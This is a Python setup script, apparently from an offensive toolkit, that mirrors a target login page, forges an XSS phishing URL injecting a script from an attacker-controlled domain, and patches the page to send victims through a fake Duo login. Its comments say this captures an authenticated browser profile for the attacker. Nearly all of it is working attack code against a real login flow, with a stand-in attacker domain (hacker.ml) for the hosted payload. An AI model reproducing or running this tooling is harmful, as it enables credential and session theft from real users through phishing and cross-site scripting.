import os 
import bs4
import sys
from bs4 import BeautifulSoup as bs

# Directory for public files exposed by https server
prefix = "./client/public/"

# Print usage
if len(sys.argv) < 3:
    print("Usage: configure.py entry-url exit-url [-y/n]overwrite " \
            + "[host-domain] [path to profiles.ini]")
    sys.exit(0)

# Parse cmd args
entry_url = sys.argv[1]
exit_url = sys.argv[2]
domain = ""

if len(sys.argv) == 5: domain = sys.argv[4]

# Function to get a yes/no response from user (interactive mode) 
# returns True if user enters y and False if he enters n
# if commandline arguments -y or -n have been given, skip interactive mode
def get_bool(msg):
    inp = ""
    while not (inp == "y" or inp == "n"):
        if len(sys.argv) == 3:
            inp = input(msg) 
        else:
            if sys.argv[3] == "-y":
                inp = "y"
            elif sys.argv[3] == "-n":
                inp = "n"
            else:
                sys.argv = sys.argv[0:3]
    return [True if inp == "y" else False][0]

# Prompt user if he wants to re-fetch / overwrite the entry webpage source
# code by deleting publix entry-site and re-getting it 
print("Entry URL:", entry_url)
if get_bool("Fetch/Overwrite Entry URL site? y/n"):
    os.system("rm -rf {0}entry-site &&  \
        mkdir -p {0}entry-site &&       \
        cd {0}entry-site &&             \
        wget -E -nH --cut-dirs=100 -k -K -p --no-check-certificate {1}"
        .format(prefix, entry_url))

# Prompt user if he wants to re-fetch / overwrite the exit webpage source
# code by deleting publix exit-site and re-getting it
print("Exit URL:", exit_url)
if get_bool("Fetch/Overwrite Exit URL site? y/n"):
    os.system("rm -rf {0}exit-site &&   \
        mkdir -p {0}exit-site &&        \
        cd {0}exit-site &&              \
        wget -E -nH --cut-dirs=100 -k -K -p --no-check-certificate {1}"
        .format(prefix, entry_url))
    
    # Rename the exit site's main html page to final.html
    # needed for re-direction in the DUO spoofer later on
    index = exit_url.split("/")[-1]
    if not index.endswith(".html"):
        print("Warning, assuming html exit site index file...")
        if index == "": index = "index"
        index += ".html"
    os.system("mv {0}exit-site/{1} {0}exit-site/final.html"
        .format(prefix, index))

# If domain wasn't set through cmd args, prompt user
if domain == "": 
    domain = input("Domain name that redirects to this machine? " \
                + "Example: hacker.ml. Domain: ")
print("Redirection domain:", domain)

# Generate phising URL. This is where the actual XSS vulnereability is
# being exploited. This url will inject payload.js into the user's site
phishing_url = "/".join(entry_url.split("/")[0:4]) \
                + "/%3cscript%20src=%68ttps%3a" \
                + domain + "/"

# Patch the entry site so that when a victim clicks login, they will
# be re-directed to the malicious duo spoofer
print("Patching Entry Site...")
index = entry_url.split("/")[-1]
if not index.endswith(".html"):
    print("Warning, assuming html entry site index file...")
    if index == "": index = "index"
    index += ".html"

entry_index_file = "{}entry-site/{}".format(prefix, index)
print("Patching index file:", entry_index_file)
with open(entry_index_file, "r+") as index_file:

    # insert the patch.js code into <body onload=
    patch_js = ""
    with open(prefix + "../patch.js", "r") as patch_file:
        patch_js = patch_file.read()
    
    # pre-pend user defined varguments into the patch
    patch_js = "var ORIG_DOM='{}';  \
        var FINAL_DOM='{}';         \
        var DOMAIN='https://{}';    \
        var PHISHING_URL='{}';      \
        {}".format(entry_url, exit_url, domain, phishing_url, patch_js)

    # write the compiled patch to the public directory
    with open(prefix + "compiled-patch.js", "w") as patch_file:
        patch_file.write(patch_js)
    
    # insert script tag with reference to the compiled patch
    html = index_file.read()
    soup = bs(html, "html.parser")
    s = soup.new_tag("script")
    s["src"] = "https://" + domain + "/compiled-patch.js"
    soup.body.insert(0, s);
    
    # insert base tag to ensure images and other resources get loaded
    b = soup.new_tag("base")
    b["href"] = "https://" + domain + "/entry-site/"
    soup.head.insert(0, b)

    # make login links clickable, triggering js nextWin() 
    for link in soup.find_all('a'):
        if "href" in link.attrs.keys() and "loginaction" in link["href"]:
            del link["href"]
            link["onclick"] = "window.nextWin()"
            link["style"] = "cursor:pointer"

    # replace external css stylesheets by their inline equivalents
    # in order to simulate browser loading correctly
    stylesheets = soup.findAll("link", {"rel": "stylesheet"})
    for s in stylesheets:
        t = soup.new_tag('style')
        with open(prefix + "entry-site/" + s["href"], "r") as css_file:
            c = bs4.element.NavigableString(css_file.read())
            t.insert(0,c)
            t['type'] = 'text/css'
            s.replaceWith(t)

    # write patched entry index html 
    index_file.seek(0, os.SEEK_SET)
    index_file.write(str(soup))

# Patch payload.js and place it in the right public directory so that
# it gets loaded through the XSS vulnreability. payload.js is the 
# 'entry point' of the spoof and gets reloaded multiple times during
# the spoof process as the user navigates from url to url
with open(prefix + "../payload.js", "r") as payload_template_file:
    payload = payload_template_file.read()
    attack_url = "https://{}/entry-site/{}".format(domain, index)

    # insert user provided variables into payload
    payload = "window.ATTACK_DOM='{}';  \
        window.ORIG_DOM='{}';           \
        window.PHISHING_URL='{}';       \
        window.FINAL_DOM='{}';          \
        {}".format(attack_url, entry_url, phishing_url, exit_url, payload)

    # place payload into domain:/'</pre where / are dir separators
    # and payload.js gets renamed to pre
    os.system("mkdir -p " + prefix + "\\'\\<")
    with open(prefix + "'</pre", "w") as payload_file:
        payload_file.write(payload)     

# Guess the firefox home path to verify that profiles.ini exists
# this is important, as when the victim authenticates succesfully in a
# docker container, the path to that docker container's data is 
# recorded in profiles.ini so that the user can open the compromised
# profile in his local install of firefox without needing to use 
# VNC to get into the docker container
firefox_path = os.path.join(os.environ['HOME'], ".mozilla/firefox")
if len(sys.argv) == 6: firefox_path = sys.argv[5]

print("Verifyng that firefox profiles.ini is at:", firefox_path)
with open(firefox_path + "/profiles.ini", "r") as firefox_ini:
    firefox_ini.read()

# Write configuration to config.ini. This file is used in run-spoof.py
# in order to initialize the https & socket server correctly
print("Writing Configuration to config.ini...")
print("Phishing URL:", phishing_url)
print("Attacker Domain Name:", domain)
with open("config.ini", "w") as cfg_file:
    cfg_file.write(phishing_url + "\n" + domain + "\n" + firefox_path)

# Make sure to re-compile any code updates in the firefox plugin 
# (used in docker container to communicate over websockets) 
print("Preparing firefox plugin zip...")
os.system("cd ./backend/containers/firefox/duo-login-ext && ./make-zip.sh")

# Make sure directory exist for firefox docker container app data
print("Creating docker container dir...")
os.system("mkdir /docker")
os.system("mkdir /docker/appdata")

print("\nFinished configuring!")
